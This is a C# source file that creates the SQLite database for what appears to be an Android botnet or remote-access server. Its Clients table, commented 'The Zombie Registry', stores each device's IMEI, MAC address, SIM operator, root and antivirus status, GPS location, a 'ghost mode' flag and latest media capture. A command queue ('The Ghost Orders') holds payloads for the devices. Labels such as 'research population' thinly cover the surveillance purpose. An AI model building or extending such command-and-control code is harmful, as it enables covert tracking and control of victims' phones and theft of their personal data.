using System;
using System.IO;
using System.Data.SQLite;

namespace TcpServerApp.Models
{
    public class EliteDB
    {
        private readonly string _dbPath;
        private readonly string _connectionString;

        public EliteDB()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string folder = Path.Combine(appData, "TcpServerApp", "EliteServer");
            Directory.CreateDirectory(folder);
            
            _dbPath = Path.Combine(folder, "shadow.db");
            _connectionString = $"Data Source={_dbPath};Version=3;";

            InitializeDatabase();
        }

        private void InitializeDatabase()
        {
            if (!File.Exists(_dbPath))
            {
                SQLiteConnection.CreateFile(_dbPath);
            }

            using var conn = GetConnection();
            conn.Open();

            // 1. Clients Table (The Zombie Registry)
            string sqlClients = @"
                CREATE TABLE IF NOT EXISTS Clients (
                    ClientId TEXT PRIMARY KEY,
                    DeviceName TEXT,
                    Model TEXT,
                    AndroidVersion TEXT,
                    IpAddress TEXT,
                    Country TEXT,
                    City TEXT,
                    FirstSeen DATETIME,
                    LastSeen DATETIME,
                    IsOnline INTEGER,
                    EncryptionKey TEXT,
                    
                    -- Elite Telemetry 🌟
                    BatteryLevel TEXT,
                    ScreenStatus TEXT,
                    Rooted INTEGER,
                    InstallDate DATETIME,
                    AppCount INTEGER,
                    
                    -- Extended Telemetry 🚀
                    SourcePort INTEGER,
                    CountryCode TEXT,
                    SimOperator TEXT,
                    IMEI TEXT,
                    MacAddress TEXT,
                    SupportedActions TEXT,
                    AvStatus TEXT,
                    WifiStrength TEXT,
                    Ping INTEGER,
                    RailPower REAL,
                    ThermalTemp REAL,
                    KernelLoad REAL,
                    NpuLoad REAL,
                    IsolatedMemory REAL,
                    IntegrityStatus TEXT,
                    ResearchPopulation TEXT,
                    IsGhostMode INTEGER,
                    
                    -- Geolocation & Security 🌍
                    Latitude REAL,
                    Longitude REAL,
                    RiskScore INTEGER,
                    LatestMediaCapture TEXT
                )";
            ExecuteCommand(conn, sqlClients);

            // 1.1 Schema Migration (Ensure columns exist for previous versions)
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN BatteryLevel TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN ScreenStatus TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN Rooted INTEGER;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN City TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN AppCount INTEGER;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN InstallDate DATETIME;"); } catch {}
            
            // Extended Telemetry Migrations 🚀
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN SourcePort INTEGER;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN CountryCode TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN SimOperator TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN IMEI TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN MacAddress TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN SupportedActions TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN AvStatus TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN WifiStrength TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN Ping INTEGER;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN RailPower REAL;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN ThermalTemp REAL;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN KernelLoad REAL;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN NpuLoad REAL;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN IsolatedMemory REAL;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN IntegrityStatus TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN ResearchPopulation TEXT;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN IsGhostMode INTEGER;"); } catch {}
            
            // Geolocation & Security Migrations 🌍
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN Latitude REAL;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN Longitude REAL;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN RiskScore INTEGER;"); } catch {}
            try { ExecuteCommand(conn, "ALTER TABLE Clients ADD COLUMN LatestMediaCapture TEXT;"); } catch {}

            // 2. Command Queue (The Ghost Orders)
            string sqlQueue = @"
                CREATE TABLE IF NOT EXISTS CommandQueue (
                    CommandId INTEGER PRIMARY KEY AUTOINCREMENT,
                    ClientId TEXT,
                    CommandType TEXT,
                    Payload TEXT,
                    Status TEXT, -- PENDING, SENT, COMPLETED, FAILED
                    CreatedAt DATETIME,
                    ExecutedAt DATETIME
                )";
            ExecuteCommand(conn, sqlQueue);
            
            // 3. Logs (The Black Box)
            string sqlLogs = @"
                CREATE TABLE IF NOT EXISTS ServerLogs (
                    LogId INTEGER PRIMARY KEY AUTOINCREMENT,
                    ClientId TEXT,
                    EventType TEXT,
                    Message TEXT,
                    Timestamp DATETIME
                )";
            ExecuteCommand(conn, sqlLogs);
            
            // 4. Federated Results (Distributed Research Data)
            string sqlFederated = @"
                CREATE TABLE IF NOT EXISTS FederatedResults (
                    ResultId INTEGER PRIMARY KEY AUTOINCREMENT,
                    ClientId TEXT,
                    Population TEXT,
                    Task TEXT,
                    Status TEXT,
                    Metric REAL,
                    Timestamp DATETIME,
                    RawPayload TEXT
                )";
            ExecuteCommand(conn, sqlFederated);
        }

        public SQLiteConnection GetConnection()
        {
            return new SQLiteConnection(_connectionString);
        }

        private void ExecuteCommand(SQLiteConnection conn, string sql)
        {
            using var cmd = new SQLiteCommand(sql, conn);
            cmd.ExecuteNonQuery();
        }
    }
}
